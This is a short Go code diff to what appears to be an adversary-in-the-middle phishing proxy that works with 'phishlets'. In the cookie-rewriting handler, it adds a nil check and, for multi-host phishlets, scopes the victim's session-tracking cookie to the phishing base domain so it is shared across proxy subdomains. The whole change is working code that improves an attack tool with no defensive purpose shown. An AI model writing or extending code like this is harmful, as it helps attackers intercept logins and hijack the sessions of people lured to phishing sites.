@@ -27,7 +27,7 @@ func (h *CookieRewriter) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 		resp.Header.Add("Set-Cookie", cookie.String())
 	}
 
-	if ctx.IsNewSession && ctx.Session != nil {
+	if ctx.IsNewSession && ctx.Session != nil && ctx.Phishlet != nil {
 		tracker := &http.Cookie{
 			Name:     proxy.SessionCookieName,
 			Value:    ctx.Session.ID,
@@ -35,6 +35,11 @@ func (h *CookieRewriter) Handle(ctx *aitm.ProxyContext, resp *http.Response) err
 			HttpOnly: true,
 			Secure:   true,
 			SameSite: http.SameSiteNoneMode,
+		}
+		// For multi-host phishlets, scope the tracking cookie to the base domain
+		// so it's shared across all proxy host subdomains.
+		if len(ctx.Phishlet.ProxyHosts) > 1 {
+			tracker.Domain = ctx.Phishlet.BaseDomain
 		}
 		resp.Header.Add("Set-Cookie", tracker.String())
 	}
